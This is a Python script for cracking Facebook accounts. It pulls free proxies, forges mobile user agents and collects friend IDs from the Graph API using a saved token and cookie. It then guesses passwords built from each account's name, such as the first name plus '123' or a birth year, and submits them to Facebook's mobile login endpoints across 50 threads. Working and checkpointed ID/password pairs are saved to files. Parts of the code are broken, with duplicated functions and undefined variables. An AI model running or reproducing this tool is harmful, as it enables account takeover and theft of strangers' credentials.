

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz

#------------------[ MACHINE-SUPPORT ]---------------#
def rfn_xd(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox) 
except Exception as e:
  print(' \x1b[1;91m \x1b[1;96m \x1b[1;97m  \x1b[1;96m[Mr.IPYTHONI]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
  a='Mozilla/5.0 (Symbian/3; Series60/'
  b=random.randrange(1, 9)
  c=random.randrange(1, 9)
  d='Nokia'
  e=random.randrange(100, 9999)
  f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
  g=random.randrange(1, 9)
  h=random.randrange(1, 4)
  i=random.randrange(1, 4)
  j=random.randrange(1, 4)
  k='Mobile Safari/535.1'
  uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
  ugen2.append(uaku)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=' en-us; GT-'
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uaku2)
for x in range(10):
  a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
  b=random.randrange(100, 9999)
  c=random.randrange(100, 9999)
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  h=random.randrange(1, 9)
  i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
  j=random.randrange(1, 9)
  k=random.randrange(1, 9)
  l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
  uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#PROXYGEN
def uaku():
  try:
    ua=open('bbnew.txt','r').read().splitlines()
    for ub in ua:
      ugen.append(ub)
  except:
    a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text
    ua=open('.bbnew.txt','w')
    aa=re.findall('line">(.*?)<',str(a))
    for un in aa:
      ua.write(un+'\n')
    ua=open('.bbnew.txt','r').read().splitlines()
    
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ Login-pag ]--------------#
j = 'x'
i = 'mbasic'
a = 'm'
b = 'g'
c = 'free'
e = 'web'
f = 'developer'

W = '\x1b[1;97m' # write
R = '\x1b[1;91m' # red
G = '\x1b[1;92m' # FLAME-NAIM                                                                
Y = '\x1b[1;93m' # Yellow
B = '\x1b[1;94m' # bule
P = '\x1b[1;95m' # pink                                                                 
nb = '\x1b[1;96m' # Bule 50%
A = '\x1b[1;90m' # WARNA ABU ABU # current

def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ INDICATION ]---------------#
		
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():

	try:

		cokbru=open('.cookie.txt').read()

		cokbrut.append(cokbru)

	except:

		login_lagi334()
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#

#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	#login()
	print('')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	rfn_xd(f'''\t
         
 [✓] \x1b[1;97m𝑻𝑶𝑶𝑳 𝑩𝒀 \033[1;91m:  \x1b[1;93m3aba
 [✓] \x1b[1;97m𝑽𝑬𝑹𝑺𝑰𝑶𝑵  \033[1;91m: \x1b[1;93m1          
 [✓] \x1b[1;97m𝑻𝑶𝑶𝑳 𝑻𝒀𝑷𝑬  \033[1;91m:  \x1b[1;93m5$               ''')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;91m 𝑪𝑳𝑰𝑪𝑲 𝑬𝑵𝑻𝑬𝑹\033[1;91m: \33[1;32m')
#--------------------[ BAGIAN-MASUK ]--------------#
#ZHiRO
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		#MPMPK()
	os.system('clear')
	os.system('clear')
	banner()
	print('\033[1;97m____________________________')
	print('\033[1;32m[01] CRACK ID PULEC \033[1;97m[\033[1;32mON\033[1;97m]')
	print('\033[1;32m[02] CRACK FILE \033[1;97m[\033[1;32mON\033[1;97m]')	
	print('[00] EXIT [GOOD BYE]')
	print('\033[1;97m____________________________')
	____ZHiRO_709____ = input('\nCHOICE : ')
	if ____ZHiRO_709____ in ['1']:
		dump_massal()
	elif ____ZHiRO_709____ in ['2']:
		crack_file()
	elif ____ZHiRO_709____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('<•> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('<•> Pilih Yang Bener Tod ')
		back()
def error():
	print(f'{k}<•> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
	
# ID PUBLIC

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'chan id  da anei?  : {p} '))
	except ValueError:
		print('<•> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('<•> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{M}PASTE ID {H} '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('<•> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'{O}All ID : {h}'+str(len(id)))
		print(f'')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('<•> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
		
		
#FILE CLONE

def crack_file():
    print('\033[0;92m=================================')
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] \x1b[1;91m𝑭𝑰𝑳𝑬 𝑫𝑨𝑵𝑬 :\033[1;30m')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;92m==================')
        animation(' [×] FILE NADOZRAYAWA')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()

def setting():
	os.system('clear')
	banner()

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
	clear()
	banner()
	method.append('mobile')
	clear()
	banner()
	if ['01','1']:
		os.system('1')
		passwrd()
	exit() 
	
# password

def passwrd():
	os.system('clear')
	banner()
	print("")
	print(" \x1b[1;94m𝑨𝑳𝑳 𝑰𝑫 𝑪𝑶𝑳𝑳𝑬𝑪𝑻𝑬𝑫 : "+str(len(id)))
	print("\033[1;30m♲︎===============================================♲︎")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'2006')
					pwv.append(frs+'2008')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					
					
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'2006')
					pwv.append(frs+'2008')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'2003')
					pwv.append(frs+'2002')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m OK = %s '%(ok))
	print('')
	print(' \033[1;37m CP = %s '%(cp))
	print('')
	exit()
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{Z}[3aba]{P} {Z}[{Z}\x1b[1;97m{loop}{Z}]—{Z}[{H}OK/{ok}{Z}]—[{K}CP/{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'prox://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'authority': 'm.facebook.com',
    'method': 'GET',
	'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type':'application/x-www-form-urlencoded',
    'origin':'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'''\n\x1b[1;93m┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓
  ◊ - 𝑰𝑫 ➛ {idf}\n
  ◊ - 𝑷𝑾 ➛ {pw}\n
┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ 𝑩𝒀 :   3aba-CP		''')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'''\n\x1b[1;92m┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓
  \n◊ - 𝑰𝑫 ➛ {idf}
  \n◊ - 𝑷𝑾 ➛ {pw}
\n┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ 𝑩𝒀 :   @GARDI404x      +      3aba-OK		''')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
	
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'â€¢'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%sâ•°â”€>Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%sâ•°â”€>%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
def cek_apk():
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
			
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('mobile .prox.txt')
	except:pass
	crack_file()
